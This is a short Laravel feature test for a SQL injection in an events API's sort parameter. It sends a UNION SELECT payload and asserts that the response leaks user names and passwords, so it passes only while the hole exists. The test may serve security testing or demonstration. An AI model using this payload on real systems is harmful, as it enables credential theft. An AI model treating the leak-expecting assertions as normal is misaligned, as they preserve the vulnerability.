<?php

namespace Tests\Feature;

use Tests\TestCase;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Foundation\Testing\WithoutMiddleware;
use Illuminate\Testing\Fluent\AssertableJson;

class SqlInjectionTest extends TestCase
{
     use RefreshDatabase, WithoutMiddleware;
    
    public function test_sql_injection_via_sort_parameter()
    {
        // Seed users table with test data
        \App\User::create([
            'name' => 'admin',
            'email' => 'admin',
            'password' => 'secretpass'
        ]);
        
        $response = $this->getJson('/api/events?sort=id UNION SELECT username,password FROM users--');
        
        $response->assertStatus(200);
        $response->assertJsonStructure([
            '*' => ['id', 'title', 'username', 'password'] // Expects leaked user fields
        ]);
        
        $response->assertJson(fn (AssertableJson $json) =>
            $json->has('0.name', 'admin')
                 ->has('0.password', 'secretpass')
                 ->etc()
        );
    }
}
